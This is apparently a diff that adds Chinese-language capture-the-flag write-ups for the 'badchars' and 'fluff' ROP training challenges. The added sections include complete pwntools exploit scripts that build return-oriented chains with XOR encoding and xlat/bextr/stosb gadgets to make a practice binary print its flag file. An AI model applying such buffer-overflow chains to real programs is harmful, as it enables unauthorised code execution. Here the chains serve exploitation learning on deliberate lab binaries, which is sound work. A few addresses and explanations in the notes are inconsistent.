@@ -171,5 +171,248 @@ io.interactive()
 
 拿到flag:`ROPE{a_placeholder_32byte_flag!}`
 
-相信有细心的同学发现了,在这段脚本里我使用了 **flat** 这个函数取代了臃肿的 **payload+=** 。在ROP链里, **flat** 可以按照顺序自动把每一段payload增添到已写的payload后面。如 `pop_rdi_rsi_rdx, a1, a2, a3,callme_one` 里,**a1,a2,a3**根据顺序依次存入寄存器**rdi,rsi,rdx**,作为调用 **callme_one** 的三个参数,保证程序正常运行。在使用 **flat** 函数时，需要在脚本开头加上这样一段话 `context.arch = 'amd64'`, 这段话可以让 `flat()` 使用 **64 位**打包。这是因为`flat()` 默认使用 **32位** 打包，数值太大超出了范围,会造成程序报错。
+相信有细心的已经发现了,在这段脚本里我使用了 **flat** 这个函数取代了臃肿的 **payload+=** 。在ROP链里, **flat** 可以按照顺序自动把每一段payload增添到已写的payload后面。如 `pop_rdi_rsi_rdx, a1, a2, a3,callme_one` 里,**a1,a2,a3**根据顺序依次存入寄存器**rdi,rsi,rdx**,作为调用 **callme_one** 的三个参数,保证程序正常运行。在使用 **flat** 函数时，需要在脚本开头加上这样一段话 `context.arch = 'amd64'`, 这段话可以让 `flat()` 使用 **64 位**打包。这是因为`flat()` 默认使用 **32位** 打包，数值太大会超出了范围,造成程序报错。
 
+## 4.badchars
+
+反汇编，查关键函数。用ida在字符列表里看到提示**usefulFunction**和**usefulGadget**,先点进有用的函数看看
+
+```c
+__int64 usefulFunction()
+{
+  return print_file("nonexistent");
+}
+```
+
+这一题是利用**printfile**函数，只要我们知道flag文件的文件名，就可以将这个地址作为**printfile**函数的参数，让它打印出flag。尝试将'flag.txt'字符串进行64位打包后塞进空的bss里作为**printfile**的参数。由于汇编里没有现成的flag.txt，猜测作者的意图是让我们把经过编码后的'flag.txt'字符串放进事先准备好的空地址，而后让这个地址作为**printfile**函数的参数，打印出flag。理论成立，现在开始动手操作。
+
+首先 shift+f7 打开**segments**列表找到我们需要的`bss`地址:0x201068，再利用ROPgadget筛选出需要的gadget 
+
+```bash
+ROPgadget --binary badchars --only 'pop|ret'
+	           |  |           |         |
+			文件的名称		  筛选	需要筛选的gadget
+###输出	0x00000000004006a3 : pop rdi ; ret
+###		0x00000000004004ee : ret
+###		0x000000000040069c : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
+###		0x00000000004006a0 : pop r14 ; pop r15 ; ret
+ROPgadget --binary badchars --only 'mov|ret'
+###输出	0x0000000000400634 : mov qword ptr [r13], r12 ; ret
+```
+
+套上模板
+
+```py
+#!/usr/bin/env python3
+from pwn import *
+# 导入pwntools的相关依赖
+context.arch = 'amd64'
+elf = ELF('./badchars')
+# 静态的ELF对象，可以访问符号表中的值
+io = process('./badchars')
+# 加载程序的进程
+pop_ret = 0x4004ee
+pop_r12_r13_r14_r15 = 0x40069c
+mov_qword_r13_r12 = 0x400634
+bss = 0x601038
+pop_rdi = 0x4006a3
+printfile = 0x400510
+flag_u64 = u64(b'flag.txt')
+payload =flat(
+    b'1'*40,
+    pop_ret,
+    pop_r12_r13_r14_r15,flag_u64,bss,0,0,
+    mov_qword_r13_r12,
+    pop_rdi,bss,
+    printfile
+)
+# 主要修改这个payload，payload里面的填充需要是bytes类型
+io.sendline(payload)
+# 将payload通过stdin发给程序
+io.interactive()
+# 进入交互模式
+```
+
+返回
+
+```
+badchars are: 'x', 'g', 'a', '.'
+> Thank you!
+```
+
+输出中并没有flag，而是一串提示。根据提示并结合**name**列表中的***badcharacters***伪代码可知,我们输入的‘flag.txt’中的'g','a','.'在read()读取输入阶段时会被程序过滤。为此我们不能直接将flag.txt传入**bss**,需要想方设法绕过可恶的过滤...(思索)...等等，我们在前面看到的usefulGadget:`xor     [r15], r14b`在这个脚本中并没有被用到,它的作用是:'r15' ^=r14b。因此我们可以考虑先将xor编码后的'flag.txt'放进**bss**，绕过初步的**read()**阶段的过滤后再在内存阶段对xor编码后的'flag.txt'进行解密，这样，就能将'flag.txt'完好无所地放进**bss**里了。立马动手试试。首先我们需要保证经过xor转换后的'flag.txt'不会被坏字符过滤,写一个脚本，寻找可用的xorkey。
+
+```py
+badchars = {0x78, 0x67, 0x61, 0x2e}  # x, g, a, .
+target = b"flag.txt"
+for key in range(1,10):
+    if all((c ^ key) not in badchars for c in target):
+        print(f"key={key} 可用")
+###	key=2 可用
+###	key=3 可用
+###	key=4 可用
+###	key=5 可用
+###	key=8 可用
+###	key=9 可用
+```
+
+确认了xorkey之后就可以写payload了，套模板
+
+```py
+#!/usr/bin/env python3
+from pwn import *
+# 导入pwntools的相关依赖
+context.arch = 'amd64'
+elf = ELF('./badchars')
+# 静态的ELF对象，可以访问符号表中的值
+io = process('./badchars')
+# 加载程序的进程
+pop_ret = 0x4004ee
+pop_r12_r13_r14_r15 = 0x40069c
+pop_r14_r15 = 0x4006a0
+mov_qword_r13_r12 = 0x400634
+bss = 0x601038
+pop_rdi = 0x4006a3
+printfile = 0x400510
+xor_key = 2
+xor_r15_r14b = 0x400628
+encoded_flag = bytes([c ^ xor_key for c in b'flag.txt'])
+q_encoded_flag = u64(encoded_flag)
+payload =flat(
+    b'1'*40,
+    pop_ret,
+    pop_r12_r13_r14_r15,q_encoded_flag,bss,0,0,
+    mov_qword_r13_r12,
+)
+for i in range(8):
+    payload += flat(
+        pop_r14_r15,xor_key,bss+i,
+        xor_r15_r14b
+    )
+payload += flat(
+    pop_rdi,bss,
+    printfile
+)
+# 主要修改这个payload，payload里面的填充需要是bytes类型
+io.sendline(payload)
+# 将payload通过stdin发给程序
+io.interactive()
+# 进入交互模式
+```
+
+成功输入flag:`ROPE{a_placeholder_32byte_flag!}`
+
+## 5.fluff
+
+用ida反汇编，查看关键函数。这题的关键函数依旧是**printfile**，不过这一题的利用思路略有不同。在ROPgadget后并没有找到可用的mov gadget,也就是说我们不能简单地直接将'flag.txt'直接通过mov直接塞入bss，继续找找别的有用条件。
+
+在**name**里找到了questionableGadget：
+
+```bash
+.text:0000000000400628                 xlat
+.text:000000000040062A ; ---------------------------------------------------------------------------
+.text:000000000040062A                 pop     rdx
+.text:000000000040062B                 pop     rcx
+.text:000000000040062C                 add     rcx, 3EF2h
+.text:0000000000400633                 bextr   rbx, rcx, rdx
+.text:0000000000400639 ; ---------------------------------------------------------------------------
+.text:0000000000400639                 stosb
+```
+
+粗略介绍一下每个gadget的作用:
+
+xlat:al = [rbx + al]，从内存读取[rbx+al]上内容的一个字节到 al
+
+stosb:[rdi] = al，然后 rdi+1
+
+bextr rbx ,rcx ,rdx: rbx = rcx 的rdx的**低 8 位**到高8位
+
+这些gadget在构造payload上都起到什么作用呢？让我们从如何让**printfile**函数为我们所用开始逆推，我们的目标是把'flag.txt'写入rdi这个gadget。stosb可以**把我们构造的al一字节一字节地写入rdi，而xlat可以用于构造al**。由于**stosb只能单字节地将al写入rdi**，因此每一次**al = [rbx + al]**后都要保证al在计算后等于我们要构造的'flag.txt'里的单字节，**所以rbx = ‘ 'flag.txt'的内存地址 - perv_al'**，这样就能在xlat后使al等于我们所需要的单字符了。由于**题目内没有能直接写入的rbx**，因此我们需要用到bextr rbx ,rcx ,rdx。**先构造rcx**，让rcx在add 3EF2h后等于我们需要构造的rbx。这样一个逻辑完整的payload思路就构造完毕了。直接上模板。
+
+```py
+#!/usr/bin/env python3
+from pwn import *
+# 导入pwntools的相关依赖
+context.arch = 'amd64'
+elf = ELF('./fluff')
+# 静态的ELF对象，可以访问符号表中的值
+io = process('./fluff')
+# 加载程序的进程
+pop_ret = 0x400295
+pop_rdi_ret = 0x4006a3
+xlat_ret = 0x400628
+pop_rdx_pop_rcx_add_bextr_ret = 0x40062a
+mov_eax_0_pop_rbp_ret = 0x400610
+stosb_ret = 0x400639
+flag_txt = [0x4003c4, 0x400239, 0x4003d6, 0x4003cf, 0x40024e, 0x400192, 0x400246,0x400192]
+bss = 0x601038
+print_file = 0x400510
+prev_al = 0
+payload = flat(
+    b'1' * 40,
+    mov_eax_0_pop_rbp_ret, 0
+)
+for c in range(8):
+    payload += flat(
+        pop_rdx_pop_rcx_add_bextr_ret, 0x4000,flag_txt[c] - 0x3ef2 - prev_al, 
+        xlat_ret,
+        pop_rdi_ret, bss + c,
+        stosb_ret
+    )
+    prev_al = ord('flag.txt'[c])
+payload += flat(
+    pop_ret,
+    pop_rdi_ret, bss,print_file
+)    
+# 主要修改这个payload，payload里面的填充需要是bytes类型
+io.sendline(payload)
+# 将payload通过stdin发给程序
+io.interactive()
+# 进入交互模式
+```
+
+反反复复写了好几次payload，终于把逻辑理清楚了，但是还是没有出flag，让ai找了原因，没曾想是payload太长了。具体成因如下，在这个payload的for循环里，每轮循环都会重新设置rdi，payload会相当臃肿从而超过了read() 阶段只能读取512字节的限制。解决方案是利用stosb会自动让下一次rdi+1的特性，不再在for循环里设置rdi，改为只在循环前设置一次rdi。正确的payload如下
+
+```py
+#!/usr/bin/env python3
+from pwn import *
+# 导入pwntools的相关依赖
+context.arch = 'amd64'
+elf = ELF('./fluff')
+# 静态的ELF对象，可以访问符号表中的值
+io = process('./fluff')
+# 加载程序的进程
+pop_ret = 0x400295
+pop_rdi_ret = 0x4006a3
+xlat_ret = 0x400628
+pop_rdx_pop_rcx_add_bextr_ret = 0x40062a
+mov_eax_0_pop_rbp_ret = 0x400610
+stosb_ret = 0x400639
+flag_txt = [0x4003c4, 0x400239, 0x4003d6, 0x4003cf, 0x40024e, 0x400192, 0x400246,0x400192]
+bss = 0x601038
+print_file = 0x400510
+prev_al = 0
+payload = flat(
+    b'1' * 40,
+    mov_eax_0_pop_rbp_ret, 0
+)
+payload += flat(pop_rdi_ret, bss)
+for c in range(8):
+    payload += flat(
+        pop_rdx_pop_rcx_add_bextr_ret, 0x4000,flag_txt[c] - 0x3ef2 - prev_al, 
+        xlat_ret,
+        stosb_ret
+    )
+    prev_al = ord('flag.txt'[c])
+payload += flat(
+    pop_ret,
+    pop_rdi_ret, bss,print_file
+)    
+# 主要修改这个payload，payload里面的填充需要是bytes类型
+io.sendline(payload)
+# 将payload通过stdin发给程序
+io.interactive()
+# 进入交互模式
+```
+
+成功输出flag:`ROPE{a_placeholder_32byte_flag!}`
